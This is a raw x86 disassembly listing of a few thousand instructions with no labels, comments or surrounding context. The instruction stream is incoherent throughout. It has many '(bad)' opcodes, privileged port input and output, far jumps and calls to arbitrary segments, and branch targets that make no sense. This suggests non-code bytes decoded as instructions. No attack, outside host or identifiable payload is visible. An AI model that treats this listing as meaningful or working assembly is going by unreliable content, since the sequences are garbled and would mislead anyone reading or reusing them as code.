  414666:	mov    dh,0x72
  414668:	test   dh,bh
  41466a:	bound  esi,QWORD PTR [edx+0x1d1b7d59]
  414670:	ror    edx,0x6
  414673:	pop    edi
  414674:	push   edi
  414675:	jmp    0x50af3a8f
  41467a:	mov    al,0xbd
  41467c:	add    al,0x91
  41467e:	jl     0x414692
  414680:	arpl   WORD PTR [edi],cx
  414682:	inc    esi
  414683:	push   ds
  414684:	xchg   dh,bh
  414686:	mov    esp,0xa194c330
  41468b:	adc    al,0xfd
  41468d:	inc    ebp
  41468e:	aam    0xf0
  414690:	sbb    eax,0x16639e8b
  414695:	out    dx,al
  414696:	sbb    DWORD PTR [edi],esp
  414698:	test   ah,dl
  41469a:	sbb    dl,BYTE PTR [edx+0x44]
  41469d:	jo     0x4146bb
  41469f:	ret    0x746f
  4146a2:	in     al,dx
  4146a3:	pop    ss
  4146a4:	sub    bl,BYTE PTR [edi]
  4146a6:	imul   esp,DWORD PTR [ebp-0x25624efb],0xa
  4146ad:	xchg   ecx,eax
  4146ae:	push   ebp
  4146af:	push   0xffffffdf
  4146b1:	cli    
  4146b2:	sub    DWORD PTR [ebx-0x3b4b0f58],esp
  4146b8:	mov    ss,WORD PTR [esi+0x411457c4]
  4146be:	jg     0x4146f6
  4146c0:	mov    esi,ebp
  4146c2:	stos   BYTE PTR es:[edi],al
  4146c3:	cmp    BYTE PTR ds:0xbc834ce6,0x71
  4146ca:	push   ss
  4146cb:	sbb    edi,DWORD PTR ds:0x800d97b0
  4146d1:	sti    
  4146d2:	ins    BYTE PTR es:[edi],dx
  4146d3:	xor    DWORD PTR [esp+ebp*8-0x1fe1b7ce],ebx
  4146da:	rcl    ebx,1
  4146dc:	sbb    al,al
  4146de:	loop   0x4146c1
  4146e0:	int    0x43
  4146e2:	pop    ds
  4146e3:	aas    
  4146e4:	xchg   edi,eax
  4146e5:	fnstcw WORD PTR [eax+0x22f930cd]
  4146eb:	test   DWORD PTR [edi],eax
  4146ed:	sahf   
  4146ee:	mov    ebx,0xb862e384
  4146f3:	sbb    al,0xad
  4146f5:	test   eax,0xf803c857
  4146fa:	pop    ebp
  4146fb:	test   eax,0xed9c8c66
  414700:	jmp    0x4146ed
  414702:	sbb    BYTE PTR [eax-0x131e8333],dh
  414708:	shl    BYTE PTR [esi-0x5829213d],cl
  41470e:	cmp    al,BYTE PTR [esi-0x6f]
  414711:	(bad)  
  414712:	sbb    al,dh
  414714:	ret    
  414715:	jne    0x41469c
  414717:	in     eax,dx
  414718:	push   esi
  414719:	jmp    0x8ad5d457
  41471e:	loope  0x414719
  414720:	adc    bh,bh
  414722:	push   ecx
  414723:	hlt    
  414724:	stos   DWORD PTR es:[edi],eax
  414725:	stc    
  414726:	and    ch,dl
  414728:	shl    DWORD PTR [edx-0x3e71a541],1
  41472e:	mov    ebx,0x8280e178
  414733:	test   ecx,edx
  414735:	mov    edi,0x8dca80d9
  41473a:	jbe    0x4146df
  41473c:	js     0x414785
  41473e:	scas   eax,DWORD PTR es:[edi]
  41473f:	ja     0x4146dc
  414741:	and    eax,0x26523571
  414746:	lahf   
  414747:	sub    bl,BYTE PTR [edi+0x2a]
  41474a:	in     al,dx
  41474b:	pusha  
  41474c:	xor    esp,DWORD PTR [edi]
  41474e:	sub    dh,BYTE PTR es:[edx-0x5b745f3]
  414755:	and    dl,0xaa
  414758:	dec    esi
  414759:	iret   
  41475a:	test   DWORD PTR [edi],edx
  41475c:	(bad)  
  41475d:	fist   WORD PTR [eax+edi*8+0x3f]
  414761:	push   ss
  414762:	popf   
  414763:	mov    ch,0xec
  414765:	xor    eax,0x773c0a14
  41476a:	or     BYTE PTR [edi+0x5d],ch
  41476d:	loopne 0x4147e6
  41476f:	sub    ecx,ebx
  414771:	sbb    cl,0x93
  414774:	or     DWORD PTR [ecx-0x78],edi
  414777:	mov    edi,0x1f3a81a
  41477c:	retf   0x3c1b
  41477f:	pop    ecx
  414780:	push   edi
  414781:	rol    DWORD PTR [esi],cl
  414783:	(bad)  
  414784:	cld    
  414785:	stos   BYTE PTR es:[edi],al
  414786:	push   0x54
  414788:	in     al,dx
  414789:	(bad)  
  41478b:	jae    0x4147c3
  41478d:	pop    ebp
  41478e:	mov    bl,0x94
  414790:	cld    
  414791:	jge    0x414741
  414793:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414794:	sti    
  414795:	sbb    eax,0x159e7699
  41479a:	jbe    0x4147e8
  41479c:	cmp    BYTE PTR [ebp+0x6c],ah
  41479f:	push   esp
  4147a0:	arpl   WORD PTR ds:0x43f6fae1,di
  4147a6:	pushf  
  4147a7:	xchg   esi,eax
  4147a8:	imul   ecx
  4147aa:	nop
  4147ab:	and    al,0xc7
  4147ad:	lds    ebp,FWORD PTR [ebp+0x2c]
  4147b0:	outs   dx,DWORD PTR ds:[esi]
  4147b1:	mov    ecx,0x5c96110d
  4147b6:	popf   
  4147b7:	or     ebp,DWORD PTR ds:[esp+eax*2-0x26]
  4147bc:	jecxz  0x414790
  4147be:	mov    ebx,0x44033998
  4147c3:	add    bh,dh
  4147c5:	push   ecx
  4147c6:	ja     0x414841
  4147c8:	fist   WORD PTR [esi]
  4147ca:	dec    esp
  4147cb:	mov    cl,BYTE PTR [esp+ebp*4+0x3242ff0a]
  4147d2:	(bad)  
  4147d3:	pop    edx
  4147d4:	(bad)  
  4147d6:	push   edx
  4147d7:	xchg   DWORD PTR [edi+0x11],esi
  4147da:	jbe    0x41484f
  4147dc:	mov    ebp,0xc40c88b0
  4147e1:	mov    esp,DWORD PTR ds:0x70d735cb
  4147e7:	xchg   ebx,eax
  4147e8:	ins    BYTE PTR es:[edi],dx
  4147e9:	jnp    0x414842
  4147eb:	xchg   ebx,eax
  4147ec:	sahf   
  4147ed:	jle    0x4147bf
  4147ef:	sbb    eax,0xebc6d047
  4147f4:	enter  0xb58f,0x98
  4147f8:	mov    al,BYTE PTR [di+0x4e8d]
  4147fd:	mov    dh,0xfc
  4147ff:	dec    eax
  414800:	mov    ds:0xad09bcc1,al
  414805:	mov    eax,0x9838f26e
  41480a:	push   esi
  41480b:	mov    cl,0x55
  41480d:	adc    BYTE PTR [ebx-0x25],bh
  414810:	lea    edi,[eax+0xbaa435c]
  414816:	fcomp  st(5)
  414818:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414819:	arpl   cx,cx
  41481b:	fwait
  41481c:	xchg   edi,eax
  41481d:	push   ebp
  41481e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41481f:	add    ah,BYTE PTR [ebp+ecx*8+0x2f]
  414823:	sbb    eax,0xc7aacb13
  414828:	sub    ah,BYTE PTR [ecx+0x6c]
  41482b:	sub    ecx,esp
  41482d:	adc    al,0xa8
  41482f:	in     al,dx
  414830:	repnz cwde 
  414832:	clc    
  414833:	xchg   edi,eax
  414834:	data16 in al,dx
  414836:	data16 mov ch,0xfe
  414839:	loopne 0x414850
  41483b:	jbe    0x4147ca
  41483d:	int    0x23
  41483f:	pop    edx
  414840:	xchg   DWORD PTR ds:0x4f462b5b,esi
  414846:	ins    BYTE PTR es:[edi],dx
  414847:	test   BYTE PTR [edx+ecx*2-0x43],dl
  41484b:	mov    WORD PTR [esi+esi*4+0x3f],fs
  41484f:	icebp  
  414850:	pop    ss
  414851:	jb     0x414839
  414853:	je     0x414883
  414855:	sbb    BYTE PTR [ebx+0x7ac99d38],al
  41485b:	adc    dl,BYTE PTR [edx-0x7]
  41485e:	in     al,0xaa
  414860:	mov    al,ds:0xc5e9cbd4
  414865:	jge    0x4148a3
  414867:	inc    ebx
  414868:	cmp    BYTE PTR [edx+0x12],al
  41486b:	dec    esi
  41486c:	push   ebp
  41486d:	repnz mov esi,ebp
  414870:	sbb    eax,0x7b5b1078
  414875:	add    cl,BYTE PTR [ebx-0x46]
  414878:	xchg   DWORD PTR [eax],ebp
  41487a:	inc    esp
  41487b:	mov    edi,0xb24def
  414880:	out    dx,eax
  414881:	scas   al,BYTE PTR es:[edi]
  414882:	lahf   
  414883:	shr    DWORD PTR ds:0xc13f9afd,1
  414889:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41488a:	sub    al,0xc7
  41488c:	mov    esp,0xcd397129
  414891:	mov    ?,esi
  414893:	ret    
  414894:	adc    BYTE PTR [esi+0x56],bh
  414897:	shl    BYTE PTR [eax-0x79c6930],0x75
  41489e:	ret    0x63f1
  4148a1:	addr16 sub eax,0x77c10227
  4148a7:	loope  0x4148e5
  4148a9:	scas   al,BYTE PTR es:[edi]
  4148aa:	pop    ss
  4148ab:	or     bl,dl
  4148ad:	push   esp
  4148ae:	dec    esi
  4148af:	adc    bl,BYTE PTR [ebx]
  4148b1:	popf   
  4148b2:	lea    ecx,[esp+edx*2-0x2704ec49]
  4148b9:	cli    
  4148ba:	pop    edi
  4148bb:	ret    
  4148bc:	shl    BYTE PTR [esi],cl
  4148be:	inc    edi
  4148bf:	mov    ?,WORD PTR [ebx-0x1594a617]
  4148c5:	xor    BYTE PTR [ebx+0x24569d72],cl
  4148cb:	add    al,0x1
  4148cd:	stos   BYTE PTR es:[edi],al
  4148ce:	add    eax,0x7f2eb007
  4148d3:	test   al,0x83
  4148d5:	int    0x12
  4148d7:	sbb    al,0xef
  4148d9:	mov    ds:0x1cebb7b6,al
  4148de:	sub    DWORD PTR [esi],ebx
  4148e0:	add    eax,0x3f68e24d
  4148e5:	adc    ecx,DWORD PTR es:[esi]
  4148e8:	add    esp,esp
  4148ea:	mov    eax,0x18936d22
  4148ef:	ret    0xcbb6
  4148f2:	push   ds
  4148f3:	ficom  WORD PTR [eax+edx*2+0x566a817b]
  4148fa:	loop   0x4148a1
  4148fc:	fsub   st,st(0)
  4148fe:	xchg   ebx,eax
  4148ff:	and    eax,0xbbcccda6
  414904:	gs enter 0x8537,0xfa
  414909:	sub    esi,ecx
  41490b:	sub    eax,0x368d5d01
  414910:	jg     0x41491b
  414912:	fwait
  414913:	imul   esp,DWORD PTR [ecx],0x61
  414916:	mov    DWORD PTR [esi+0x20],ebx
  414919:	and    ah,BYTE PTR [eax-0x60]
  41491c:	popa   
  41491d:	jg     0x4148bf
  41491f:	pop    fs
  414921:	daa    
  414922:	push   ds
  414923:	neg    DWORD PTR [ebx+0x19]
  414926:	xor    al,0xb6
  414928:	mov    eax,0xeccecc81
  41492d:	pop    ss
  41492e:	cmp    DWORD PTR [edx-0x7450b8a8],ebp
  414934:	popf   
  414935:	adc    al,0x61
  414937:	xor    al,0xbc
  414939:	sub    eax,0x9dff8bad
  41493e:	shl    eax,0x7a
  414941:	jnp    0x4148dc
  414943:	fstp   DWORD PTR [edi+0x338024d7]
  414949:	icebp  
  41494a:	icebp  
  41494b:	jp     0x4148fa
  41494d:	push   0x1c
  41494f:	jne    0x4148dd
  414951:	mov    bh,0x33
  414953:	mov    bh,0xec
  414955:	out    dx,eax
  414956:	xchg   ebx,eax
  414957:	(bad)  
  414958:	test   al,0x4a
  41495a:	int3   
  41495b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41495c:	outs   dx,DWORD PTR ds:[esi]
  41495d:	jmp    edx
  41495f:	mov    al,ds:0x500ab7db
  414964:	in     al,0x63
  414966:	nop
  414967:	out    dx,eax
  414968:	sti    
  414969:	cld    
  41496a:	add    DWORD PTR [ebx],esi
  41496c:	xchg   edx,eax
  41496d:	and    BYTE PTR [ecx+0x6d],ch
  414970:	inc    edx
  414971:	mov    ch,0xc0
  414973:	inc    ebp
  414974:	shr    DWORD PTR [edx],1
  414976:	retf   0xc633
  414979:	xchg   edi,eax
  41497a:	sub    bl,bh
  41497c:	fcmove st,st(1)
  41497e:	inc    ecx
  41497f:	pop    edx
  414980:	cmp    DWORD PTR [esi+edx*8+0x70],0x177661d5
  414988:	push   es
  414989:	fwait
  41498a:	push   edx
  41498b:	jns    0x414940
  41498d:	retf   
  41498e:	mov    dl,0x7b
  414990:	xor    al,0x2b
  414992:	jmp    0x2c5f:0x47b66b9
  414999:	outs   dx,DWORD PTR ds:[esi]
  41499a:	xadd   eax,esi
  41499d:	adc    ch,BYTE PTR ds:0xe7c57486
  4149a3:	add    cl,BYTE PTR [edi-0x21]
  4149a6:	xchg   ebx,eax
  4149a7:	in     eax,dx
  4149a8:	add    BYTE PTR [ebx+0x26150fe],ah
  4149ae:	jbe    0x4149db
  4149b0:	jle    0x4149f6
  4149b2:	adc    eax,0xc5710ab2
  4149b7:	test   al,0xbc
  4149b9:	mov    eax,edx
  4149bb:	add    BYTE PTR [edx],bh
  4149bd:	gs jle 0x41499a
  4149c0:	push   ds
  4149c1:	aam    0x56
  4149c3:	(bad)  
  4149c4:	pop    ss
  4149c5:	push   edx
  4149c6:	or     cl,BYTE PTR [esi]
  4149c8:	or     DWORD PTR [ecx-0x47],ebx
  4149cb:	in     al,0xad
  4149cd:	js     0x41497d
  4149cf:	fwait
  4149d0:	push   0x35035874
  4149d5:	dec    eax
  4149d6:	neg    BYTE PTR [ecx-0x2c]
  4149d9:	loope  0x4149de
  4149db:	push   ds
  4149dc:	fld    DWORD PTR [eax]
  4149de:	in     eax,dx
  4149df:	fwait
  4149e0:	out    0xbd,eax
  4149e2:	imul   ecx,DWORD PTR [ecx-0x123fff8f],0xffffffcc
  4149e9:	pop    es
  4149ea:	add    ch,0x1e
  4149ed:	fwait
  4149ee:	rcr    DWORD PTR [edx+0x3c],1
  4149f1:	lods   eax,DWORD PTR ds:[esi]
  4149f2:	cmp    al,0xdb
  4149f4:	mov    dl,0x79
  4149f6:	iret   
  4149f7:	mov    ebp,0x32364fd2
  4149fc:	imul   ebp,DWORD PTR [edi+edi*1+0x36612d81],0xffffff88
  414a04:	mov    esi,DWORD PTR [edi]
  414a06:	pop    eax
  414a07:	sbb    esp,DWORD PTR [ecx+0x5f]
  414a0a:	and    WORD PTR [ebp-0x39],0x16ee
  414a10:	pop    ecx
  414a11:	aas    
  414a12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a13:	les    edx,FWORD PTR [eax+edi*1]
  414a16:	imul   ebp,eax,0xc0337c47
  414a1c:	out    0xf5,eax
  414a1e:	mov    cl,cl
  414a20:	cmp    al,0xdd
  414a22:	push   edi
  414a23:	mov    al,ds:0x3cb387aa
  414a28:	fsubr  DWORD PTR [ecx-0x67]
  414a2b:	adc    DWORD PTR [edi+ebp*8+0x65],eax
  414a2f:	stc    
  414a30:	dec    esi
  414a31:	inc    ecx
  414a32:	sti    
  414a33:	inc    edx
  414a34:	test   eax,0xfd09611
  414a39:	mov    ah,0x87
  414a3b:	pop    edi
  414a3c:	xor    ebp,DWORD PTR [edx-0x3adff5c1]
  414a42:	jmp    0xb55c:0xa4f33522
  414a49:	repnz or DWORD PTR fs:[ebp-0x255a69a7],ebx
  414a51:	add    al,0x3b
  414a53:	lods   eax,DWORD PTR ds:[esi]
  414a54:	gs sahf 
  414a56:	imul   BYTE PTR [edx]
  414a58:	rol    bh,0x7d
  414a5b:	jbe    0x414a82
  414a5d:	inc    ecx
  414a5e:	mov    ds:0x18f35add,eax
  414a63:	adc    eax,0x96fc3ba4
  414a68:	int3   
  414a69:	xchg   esi,eax
  414a6a:	jg     0x414a62
  414a6c:	mov    ?,WORD PTR [ebx+0x4c43157a]
  414a72:	dec    esi
  414a73:	dec    esi
  414a74:	ss mov dh,0x3
  414a77:	jae    0x414abe
  414a79:	jno    0x414a25
  414a7b:	dec    ebp
  414a7c:	shr    BYTE PTR [eax],cl
  414a7e:	mov    ecx,0x459539d0
  414a83:	leave  
  414a84:	mov    edx,0x4dc44523
  414a89:	or     eax,0x67eecb7a
  414a8e:	dec    eax
  414a8f:	aas    
  414a90:	out    0x92,al
  414a92:	nop
  414a93:	push   edi
  414a94:	imul   ebx,DWORD PTR [ecx-0xa34408c],0xfffffff2
  414a9b:	mov    ds:0xa1602ecb,al
  414aa0:	inc    edx
  414aa1:	loop   0x414b0c
  414aa3:	add    BYTE PTR [edx+0x4090c690],ah
  414aa9:	sub    al,0xde
  414aab:	test   DWORD PTR [edi],esi
  414aad:	ja     0x414a7e
  414aaf:	push   edx
  414ab0:	dec    esp
  414ab1:	sbb    bl,BYTE PTR [edi-0xf07e2fe]
  414ab7:	mov    edi,0x2665dddf
  414abc:	push   cs
  414abd:	or     ch,ah
  414abf:	lods   eax,DWORD PTR ds:[esi]
  414ac0:	ins    DWORD PTR es:[edi],dx
  414ac1:	icebp  
  414ac2:	dec    ebp
  414ac3:	mov    al,0x89
  414ac5:	mov    edx,es
  414ac7:	pop    esp
  414ac8:	jge    0x414a52
  414aca:	in     eax,0xbb
  414acc:	nop
  414acd:	mov    ebx,0xe838ebd1
  414ad2:	adc    dl,BYTE PTR [ebx-0x60]
  414ad5:	ret    
  414ad6:	add    ebx,ecx
  414ad8:	aas    
  414ad9:	jno    0x414a71
  414adb:	pop    esi
  414adc:	sbb    al,0x54
  414ade:	inc    esp
  414adf:	mov    esp,0x207dfccb
  414ae4:	out    0x9a,al
  414ae6:	add    edi,ebx
  414ae8:	mov    ds:0xc54f7ee4,al
  414aed:	lea    edx,[esi]
  414aef:	adc    esp,edi
  414af1:	shr    BYTE PTR [esi-0xd957a51],cl
  414af7:	out    0x7a,eax
  414af9:	sub    eax,0xa662acd4
  414afe:	cmp    DWORD PTR [edi],esp
  414b00:	data16 outs dx,BYTE PTR ds:[esi]
  414b02:	rcl    ch,1
  414b04:	inc    ecx
  414b05:	lea    ebx,ss:[edx]
  414b08:	sbb    ebp,esp
  414b0a:	push   esp
  414b0b:	add    bl,dh
  414b0d:	(bad)
  414b11:	sub    DWORD PTR [esi-0x4bbde892],0xfb2779d8
  414b1b:	mov    esi,0xab3cfdd5
  414b20:	sub    DWORD PTR [esi+0x71028ea5],ecx
  414b26:	and    al,0xd6
  414b28:	inc    ecx
  414b29:	nop
  414b2a:	daa    
  414b2b:	xor    BYTE PTR [ebx-0x28],ah
  414b2e:	dec    esi
  414b2f:	push   ecx
  414b30:	jg     0x414ad5
  414b32:	fwait
  414b33:	dec    eax
  414b34:	fidiv  WORD PTR [edx-0x42d8f2e4]
  414b3a:	out    dx,al
  414b3b:	pusha  
  414b3c:	cwde   
  414b3d:	popf   
  414b3e:	out    dx,eax
  414b3f:	sbb    esi,DWORD PTR [ebx-0x7f662001]
  414b45:	mov    edx,0xd7393b0
  414b4a:	sbb    al,0x4c
  414b4c:	pop    edx
  414b4d:	adc    DWORD PTR [eax+0x2bb8fb81],eax
  414b53:	sahf   
  414b54:	neg    BYTE PTR [ebx-0x44]
  414b57:	aaa    
  414b58:	in     al,dx
  414b59:	inc    edx
  414b5a:	sub    ecx,DWORD PTR [esi+0x378b3d42]
  414b60:	ins    BYTE PTR es:[edi],dx
  414b61:	mov    ah,0xa7
  414b63:	retf   
  414b64:	or     esi,eax
  414b66:	outs   dx,DWORD PTR ds:[esi]
  414b67:	or     bl,BYTE PTR [ebx+0x52]
  414b6a:	xchg   edx,eax
  414b6b:	aam    0x74
  414b6d:	push   ebp
  414b6e:	and    eax,0x180b685
  414b73:	pusha  
  414b74:	or     edx,edx
  414b76:	daa    
  414b77:	adc    dh,BYTE PTR [edx-0x3ecc3a60]
  414b7d:	rcr    DWORD PTR [edi],1
  414b7f:	mov    DWORD PTR [eax],esi
  414b81:	pusha  
  414b82:	and    eax,DWORD PTR [eax+0x7e6c16f4]
  414b88:	cmp    DWORD PTR fs:[eax],esi
  414b8b:	aad    0x2e
  414b8d:	cmp    ecx,eax
  414b8f:	sar    dh,1
  414b91:	add    dl,cl
  414b93:	or     DWORD PTR [edi+0x34],ecx
  414b96:	into   
  414b97:	xlat   BYTE PTR ds:[ebx]
  414b98:	mov    bl,0x2
  414b9a:	adc    ecx,DWORD PTR ds:0x5db43a73
  414ba0:	adc    eax,0x4a061212
  414ba5:	sbb    BYTE PTR [eax+ebp*4-0x76],al
  414ba9:	add    eax,DWORD PTR [ecx+0x2ab5875]
  414baf:	icebp  
  414bb0:	sbb    al,0x17
  414bb2:	hlt    
  414bb3:	inc    ebp
  414bb4:	and    eax,0xe1bcd5de
  414bb9:	les    eax,FWORD PTR [eax+edx*2]
  414bbc:	aas    
  414bbd:	pop    ds
  414bbe:	xchg   ebp,eax
  414bbf:	or     eax,0xd93db6dc
  414bc4:	jmp    FWORD PTR [ecx+0xa6f0e87]
  414bca:	cld    
  414bcb:	xchg   BYTE PTR [eax+0x185a940a],bl
  414bd1:	lahf   
  414bd2:	or     BYTE PTR [ecx],bh
  414bd4:	pop    ecx
  414bd5:	pop    ss
  414bd6:	mov    ebp,0x610e5b82
  414bdb:	xor    BYTE PTR [ebx+0x3b7390a3],0xf6
  414be2:	retf   
  414be3:	aam    0x3b
  414be5:	enter  0x2907,0xb4
  414be9:	dec    ecx
  414bea:	scas   eax,DWORD PTR es:[edi]
  414beb:	pop    esp
  414bec:	(bad)  
  414bed:	out    0x60,al
  414bef:	call   0xa468:0x93b97291
  414bf6:	cmp    BYTE PTR [ecx-0x35],dh
  414bf9:	push   ebp
  414bfa:	xchg   BYTE PTR [edi],dh
  414bfc:	daa    
  414bfd:	sahf   
  414bfe:	and    eax,0xfe6d8182
  414c03:	push   esp
  414c04:	mov    dl,0x9b
  414c06:	call   0x3dc6:0xd649c3be
  414c0d:	jb     0x414bcd
  414c0f:	ins    DWORD PTR es:[edi],dx
  414c10:	sti    
  414c11:	popf   
  414c12:	lahf   
  414c13:	xchg   ecx,eax
  414c14:	jnp    0x414bed
  414c16:	loop   0x414bf5
  414c18:	test   DWORD PTR [ecx+0x27762026],0x92734bae
  414c22:	sar    DWORD PTR [ebx-0x7188c196],1
  414c28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c29:	ja     0x414bbc
  414c2b:	push   ecx
  414c2c:	bnd js 0x414bf9
  414c2f:	sar    DWORD PTR [eax+0xf],cl
  414c32:	test   DWORD PTR [eax],edx
  414c34:	aaa    
  414c35:	cmp    dl,BYTE PTR [edx]
  414c37:	out    dx,al
  414c38:	lds    ebp,FWORD PTR [ecx-0x4e]
  414c3b:	inc    ebx
  414c3c:	imul   ecx,DWORD PTR [ecx-0x2b],0x2a487417
  414c43:	push   cs
  414c44:	ds pop edi
  414c46:	cli    
  414c47:	fldenv [edi+ebx*4-0x40ebd2c0]
  414c4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c4f:	jno    0x414ca0
  414c51:	add    al,bl
  414c53:	pushf  
  414c54:	jmp    0xe707:0x9e99d11b
  414c5b:	je     0x414c9c
  414c5d:	(bad)  
  414c5e:	fdivp  st(0),st
  414c60:	cmp    bl,BYTE PTR [ebx]
  414c62:	cmp    edx,ebp
  414c64:	fnstenv [ebx+ebx*2-0x30318d45]
  414c6b:	pop    es
  414c6c:	loopne 0x414c83
  414c6e:	mov    esi,0x6afd6f54
  414c73:	stc    
  414c74:	or     dh,0xf
  414c77:	mov    DWORD PTR [ebx],edx
  414c79:	mov    ss,WORD PTR [ebp+0x6565a887]
  414c7f:	push   esp
  414c80:	or     ch,BYTE PTR [esp+eax*8+0x56]
  414c84:	inc    edx
  414c85:	popa   
  414c86:	or     esp,DWORD PTR [edi+ecx*1]
  414c89:	bnd jnp 0x414cc9
  414c8c:	dec    esi
  414c8d:	sub    eax,0xbf4f8632
  414c92:	cmp    edx,edi
  414c94:	push   esp
  414c95:	push   ss
  414c96:	cld    
  414c97:	call   0xe359:0xcf87ad77
  414c9e:	and    al,0x32
  414ca0:	pushf  
  414ca1:	sbb    al,0x51
  414ca3:	push   ds
  414ca4:	xlat   BYTE PTR ds:[ebx]
  414ca5:	dec    esp
  414ca6:	rcl    bl,1
  414ca8:	mov    eax,0xd0090675
  414cad:	or     ah,BYTE PTR [ecx-0x49bf5ddd]
  414cb3:	pop    esp
  414cb4:	call   0xa584:0x7f765f55
  414cbb:	and    DWORD PTR [ebp-0xc],0x2abeb847
  414cc2:	loop   0x414d32
  414cc4:	sbb    BYTE PTR [edx],dh
  414cc6:	frstor [ebx+0x7faec6cd]
  414ccc:	mov    dh,BYTE PTR [eax+0x33]
  414ccf:	std    
  414cd0:	cld    
  414cd1:	pusha  
  414cd2:	dec    esp
  414cd3:	mov    bh,0x51
  414cd5:	sub    esp,DWORD PTR [edx-0x10]
  414cd8:	pop    ecx
  414cd9:	imul   ebx,esi,0xffffffee
  414cdc:	adc    BYTE PTR [esp+esi*4+0x34842f9],bl
  414ce3:	lea    ebp,[edi+0x25]
  414ce6:	xchg   ch,ch
  414ce8:	push   0xce5775db
  414ced:	pushf  
  414cee:	jns    0x414d45
  414cf0:	sub    ch,dh
  414cf2:	cdq    
  414cf3:	dec    ebx
  414cf4:	mov    cl,0x56
  414cf6:	int3   
  414cf7:	pop    ebp
  414cf8:	add    BYTE PTR [edx],ch
  414cfa:	in     eax,0xaf
  414cfc:	dec    ecx
  414cfd:	stc    
  414cfe:	mov    dl,0x7e
  414d00:	sbb    esi,DWORD PTR [edi]
  414d02:	jno    0x414d38
  414d04:	mov    ebx,0xbc79c147
  414d09:	dec    edx
  414d0a:	nop
  414d0b:	out    0x38,eax
  414d0d:	inc    ebp
  414d0e:	div    DWORD PTR [edx+0x35]
  414d11:	in     al,0xed
  414d13:	mov    eax,ds:0x488b0061
  414d18:	pop    ebp
  414d19:	dec    esp
  414d1a:	cld    
  414d1b:	lahf   
  414d1c:	adc    ebp,DWORD PTR [ebx]
  414d1e:	inc    esp
  414d1f:	dec    esi
  414d20:	(bad)  
  414d21:	xor    al,0x52
  414d23:	cmp    eax,0x8f23c298
  414d28:	cmp    edi,DWORD PTR [eax-0x29]
  414d2b:	dec    esi
  414d2c:	stos   DWORD PTR es:[edi],eax
  414d2d:	pusha  
  414d2e:	ret    
  414d2f:	sub    DWORD PTR [ebp+0x65],ecx
  414d32:	cmp    eax,0x50eea82
  414d37:	or     DWORD PTR [ebx+0x22],eax
  414d3a:	ret    0xd2c1
  414d3d:	mov    dl,0xe8
  414d3f:	ds test al,0x7d
  414d42:	mov    al,ds:0xa4a2fc95
  414d47:	lods   eax,DWORD PTR ds:[esi]
  414d48:	push   edi
  414d49:	cmp    eax,0xaaba803b
  414d4e:	jle    0x414d80
  414d50:	(bad)  
  414d51:	sbb    eax,0x4f7567f3
  414d56:	and    BYTE PTR [eax+esi*4],bh
  414d59:	popf   
  414d5a:	out    dx,eax
  414d5b:	and    bl,ah
  414d5d:	or     dh,dh
  414d5f:	mov    ds:0xbd95be6f,eax
  414d64:	lds    esp,FWORD PTR [eax]
  414d66:	add    eax,esi
  414d68:	mov    cl,0x68
  414d6a:	xor    eax,0x8f027c6c
  414d6f:	mov    BYTE PTR [ecx-0x4aa7de2d],bl
  414d75:	fs pusha 
  414d77:	add    al,0xc7
  414d79:	mov    al,ds:0xae4b3562
  414d7e:	cmp    DWORD PTR [esi-0x595af7cb],esp
  414d84:	es push edi
  414d86:	adc    al,0xee
  414d88:	sbb    BYTE PTR [eax],ah
  414d8a:	mov    eax,0xb2617310
  414d8f:	(bad)  
  414d90:	cmc    
  414d91:	shl    BYTE PTR [ebx+0xc0b169f],cl
  414d97:	jle    0x414dbf
  414d99:	outs   dx,BYTE PTR ds:[esi]
  414d9a:	rsqrtps xmm3,XMMWORD PTR [ebx-0x4fc0a459]
  414da1:	data16 adc al,0x57
  414da4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414da5:	mov    ah,0x60
  414da7:	sub    edi,DWORD PTR [ebx+0xc]
  414daa:	jp     0x414d38
  414dac:	and    BYTE PTR cs:[ebx],bh
  414daf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414db0:	cmp    eax,0x426c9fe6
  414db5:	fst    QWORD PTR [ecx+edi*4]
  414db8:	jae    0x414e0c
  414dba:	out    0xaf,al
  414dbc:	jge    0x414de9
  414dbe:	cli    
  414dbf:	or     ah,bl
  414dc1:	mov    ebp,0xdf4988ce
  414dc6:	add    al,0x99
  414dc8:	jne    0x414d71
  414dca:	adc    ebx,DWORD PTR [ebp-0x4704fc2d]
  414dd0:	popa   
  414dd1:	hlt    
  414dd2:	lods   al,BYTE PTR ds:[esi]
  414dd3:	jae    0x414dc8
  414dd5:	or     bl,ch
  414dd7:	(bad)  
  414dd8:	bound  eax,QWORD PTR [ebx]
  414dda:	in     eax,0xa6
  414ddc:	stos   DWORD PTR es:[edi],eax
  414ddd:	xchg   esi,eax
  414dde:	in     eax,dx
  414ddf:	(bad)  
  414de1:	mov    ebp,0x12e736b8
  414de6:	int    0xe5
  414de8:	mov    esp,0x8276288b
  414ded:	adc    al,0xd0
  414def:	and    eax,0xf2119c59
  414df4:	sti    
  414df5:	call   0x9fd79f91
  414dfa:	xchg   edi,eax
  414dfb:	and    dl,dl
  414dfd:	pop    ebx
  414dfe:	stos   BYTE PTR es:[edi],al
  414dff:	pop    esp
  414e00:	int    0xa1
  414e02:	sbb    BYTE PTR [edx-0x69a594d3],bh
  414e08:	jl     0x414e20
  414e0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e0b:	cmp    BYTE PTR [ebx+0x5b431f81],al
  414e11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e12:	mov    bl,0x84
  414e14:	push   es
  414e15:	sbb    ch,BYTE PTR [edx]
  414e17:	add    eax,ecx
  414e19:	sub    esi,DWORD PTR [esi-0x60f8cce]
  414e1f:	es data16 sbb al,0x25
  414e23:	scas   al,BYTE PTR es:[edi]
  414e24:	mov    ecx,0x2258f4f2
  414e29:	sub    al,BYTE PTR [esi]
  414e2b:	call   0x66a8147b
  414e30:	call   0x14ec:0x6d10f822
  414e37:	repz rol BYTE PTR [esi-0x56ba685],cl
  414e3e:	rcr    ebp,1
  414e40:	xchg   ecx,eax
